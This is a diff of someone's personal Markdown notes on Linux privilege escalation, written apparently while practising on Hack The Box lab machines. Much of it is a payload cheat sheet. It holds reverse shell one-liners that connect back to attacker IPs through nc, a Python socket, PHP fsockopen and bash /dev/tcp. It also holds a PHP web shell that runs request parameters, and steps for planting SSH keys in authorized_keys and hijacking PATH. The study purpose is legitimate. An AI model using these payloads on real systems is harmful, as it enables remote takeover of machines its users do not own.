@@ -5,41 +5,60 @@
 There are two common types of privilege escalation: vertical and horizontal. Vertical privilege escalation involves a user accessing files or functions that are normally associated with accounts that have higher privileges. Horizontal privilege escalation allows users to access resources in other accounts with similar privilege levels as they have.
 </blockquote>
 
+<br/><br/>
 
 
 ## Linux-Smart-Enumeration
 * Check out the github page right <a href="https://github.com/diego-treitos/linux-smart-enumeration">here</a>.
 
+<br/><br/>
 
 
+## Reverse Shells  
 
-## Most Reliable Reverse Shell Payload  
-	```console
-	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
-	```  
-
+* Most Reliable Rev Shell EVER!  
+  ```cmd
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
+  ```  
 
 * Python Rev Shell  
 
-```console
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-```
+  ```python
+  python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+  ```
 
 * Another one   
 
-```console
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-```
+  ```python
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+  ```  
+
+* php  rev shell  
+  ```php  
+  php -r '$s=fsockopen("10.10.14.74",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'   
+  ```
+
+<br/><br/>
+
+## Web Shells  
+
+* A php web shell  
+
+  ```php
+  <?php 
+  passthru($_REQUEST['cmd']);
+  ?>
+  ```  
+
+<br/><br/>
 
 
 
 ## Upgrade the Reverse Shell   
 
-
-
 * Using `socat` instead of `nc`  
 
-	```console
+	```cmd
 	#Listener
 	socat file:`tty`,raw,echo=0 tcp-listen:4444
 
@@ -48,7 +67,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 	```  
 
 * Using stty options (Never Worked With Me) 
-	```console
+	```cmd
 	# In reverse shell 
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
 	ctrl-z  
@@ -68,6 +87,14 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 * If we type `stty -a` it will give me info and I can get the rows and columns from there.
 * I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  
 
+
+
+* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)   
+
+<br/><br/>
+
+
+
 ## Sudo & Sudoers   
 
 * We can use `sudo` to give the current user privilege to do something as another user as follows `sudo -u [USERNAME] [COMMAND]` by default without the `-u` option it gives the user root privilege if the user was in the sudoers file, which also can't be accessed unless the user had privilege to access it.
@@ -83,13 +110,13 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 * We can use ssh keys to privesc  
 
-```console
-Shatha Barqawi@htb[/htb]$ vim id_rsa
-Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
-Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
+  ```cmd
+  Shatha Barqawi@htb[/htb]$ vim id_rsa
+  Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
+  Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
 
-root@remotehost#
-```  
+  root@remotehost#
+  ```  
 
 * This ssh key can be found in the following path if I have access to it `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`.
 
@@ -100,7 +127,7 @@ Note that we used the command 'chmod 600 id_rsa' on the key after we created it 
 * We can also put our public key in the directory `/home/user/.ssh/authorized_keys` if we have the permissions to do so. How to do that?  
 
 * Create key on my machine 
-	```console
+	```cmd
 	Shatha Barqawi@htb[/htb]$ ssh-keygen -f key
 	```
 * This will create two file `key` (which we will use with `ssh -i`) and `key.pub`(which we will copy to the remote machine).
@@ -164,12 +191,6 @@ export PATH=$PATH:/tmp
 export PATH=/tmp:$PATH
 ```
 
-____ 
-I have to write more about this 
-* SUID (Set owner User ID)
-
-
-
 <br/>
 
 * `[COMMAND] | tee [FILE NAME]` 
@@ -185,20 +206,15 @@ I have to write more about this
 <br/>
 
 * Some info on gcc  
-* The option `-Wall` is a warning option.  
-* ### <span class="useful_shit subtitle">Upgrading The Reverse Shell   
-
-* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  
-
-
-* NetCat 
-  * It can be used to scan for open ports `nc -z -v 10.10.8.8 20-80`.  
+* The option `-Wall` is a warning option.    
+ 
+ 
 
 
-```console
-php -r '$s=fsockopen("10.10.14.74",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");' 
+<br/><br/>
 
-$s=fsockopen("10.10.14.74",1234);system("/bin/sh -i <&3 >&3 2>&3");
 
-bash -i >& /dev/tcp/10.10.14.74/1234 0>&1
-```
+
+## SUID  
+
+* You can use the tool `SUID3NUM` to check if any of the files that have the sticky bit are interesting or not.
